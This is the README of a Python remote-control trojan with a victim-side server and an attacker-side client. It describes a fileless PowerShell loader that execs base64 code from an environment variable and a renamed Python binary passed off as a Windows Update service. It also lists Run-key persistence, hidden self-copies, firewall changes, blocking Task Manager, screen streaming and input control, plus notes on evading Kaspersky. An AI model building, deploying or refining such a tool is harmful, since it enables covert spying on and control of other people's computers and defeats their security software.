# LAN Remote Control Tool

A Python-based LAN remote control tool consisting of a server (victim side) and client (attacker side) with stealth delivery via PowerShell loader.

## Files

| File | Description |
|------|-------------|
| `serveranydusk.py` | Server source — runs on victim machine |
| `serveranydusk(local).py` | Backup copy of server (in case Kaspersky deletes the original) |
| `webclient(local).py` | Client source — runs on attacker machine |
| `server.ps1` | PowerShell loader — launches server without .py on disk |
| `server.cmd` | Hidden launcher for server.ps1 (double-click to run) |

## Requirements

### Victim (Server)

Python 3.12 with the following packages (auto-installed by loader if missing):

- `numpy`
- `opencv-python-headless`
- `pyautogui`
- `keyboard`
- `pynput`
- `psutil`
- `mss`

### Attacker (Client)

Python 3.x with no external dependencies (uses only stdlib: `socket`, `threading`, `zlib`, `sys`, `os`).

## Usage

### Method 1: Direct Python (simple)

```bash
# On victim — start server
python serveranydusk.py

# On attacker — connect client
python webclient(local).py
```

### Method 2: Stealth Loader (no .py on disk)

```bash
# Copy server.ps1 and server.cmd to victim machine, then run:
server.cmd
```

The PowerShell loader:
1. Embeds server code as base64 inside `server.ps1`
2. Finds or downloads Python (embeddable) to `%LOCALAPPDATA%\Python312\wupsvc.exe`
3. Runs `wupsvc.exe -c "exec(base64.b64decode(os.environ['PYLOAD']))"`
4. No `.py` file on disk — code lives only in memory via environment variable

### Method 3: Regenerate Loader

```bash
python gen_ps_loader.py serveranydusk.py server
```

This produces `server.ps1` + `server.cmd` with the latest server code embedded.

## Server Features

| Feature | Command |
|---------|---------|
| Remote desktop streaming | Automatic on connect |
| Move mouse | `move <dx> <dy>` |
| Left/right click | `click left` / `click right` |
| Click at position | `click_at <x> <y>` |
| Type text | `type <text>` |
| Press key | `key <keyname>` |
| Special keys | `special_key ctrl/shift/alt/enter/esc/space/tab` |
| Open URL | `open <url>` |
| Reverse mouse | `reverse_mouse` |
| Auto move | `automove [speed]` |
| Auto click | `autoclick [interval] [duration]` |
| Lock screen | `lock_screen` |
| Unlock screen | `unlock` |
| Block Task Manager | `block_taskmgr` |
| Fake virus popup | `fake_virus` |
| Fake error popup | `fake_error` |
| Rick roll | `rick` |
| Shutdown | `shutdown` |
| Disconnect | `exit` |

## Stealth Mechanisms

### Self-Installation

- Copies itself to `%LOCALAPPDATA%\Microsoft\Windows\Caches\WindowsUpdateHelper.exe`
- Sets hidden + system file attributes
- Adds to `HKCU\...\Run` for persistence

### Process Hiding

- Renames `python.exe` → `wupsvc.exe` (appears as "Windows Update Service" in Task Manager)
- Server hides console window via `ShowWindow(GetConsoleWindow(), 0)`
- `CREATE_NO_WINDOW` flag when spawning subprocesses

### Mutex

- Creates `Global\WindowsUpdateSvc` mutex to prevent multiple instances

### Firewall

- Attempts to add inbound firewall rules via `netsh advfirewall`

### UDP Discovery

- Broadcasts `ip:65432` to `255.255.255.255:45631` every 2 seconds
- Client auto-discovers server on LAN without knowing IP

## Network Protocol

- **TCP** `0.0.0.0:65432` — command and control channel
- **UDP** `255.255.255.255:45631` — auto-discovery broadcast

### Screen Streaming

- Server captures screen via `mss`, converts to JPEG (quality 40%)
- Sends as: `<4-byte big-endian length><compressed JPEG data>`
- Client displays in real-time

### Command Protocol

- Commands are plain text strings sent over TCP
- Format: `<command> [args...]`
- Example: `move 50 -30`, `click left`, `type hello world`

## Anti-Detection Notes

- **Kaspersky** detects compiled C loaders (XOR+zlib + CreateProcessA + dynamic API resolution) even with obfuscation
- **PowerShell loader** bypasses this — no binary to scan, just base64 in environment variable
- `.py` files may be deleted by real-time protection — always keep `(local)` backup
- `wupsvc.exe` rename helps evade casual inspection but not signature-based detection

## Regenerating Loaders

```bash
# PowerShell loader (recommended)
python gen_ps_loader.py <input.py> <output_name>

# C loader (detected by Kaspersky)
python gen_loader.py <input.py> <output_name> [-mwindows]
```

## Architecture

```
Attacker                          Victim
┌──────────────────┐             ┌──────────────────┐
│ webclient(local)  │◄───TCP────►│ serveranydusk.py  │
│                   │  65432     │                   │
│ stdin → commands  │            │ screen → stream   │
│ display ← screen  │            │ commands → action │
└──────────────────┘             └──────────────────┘
                                        │
                                   UDP broadcast
                                   255.255.255.255:45631
                                        │
                                  Auto-discovery
```
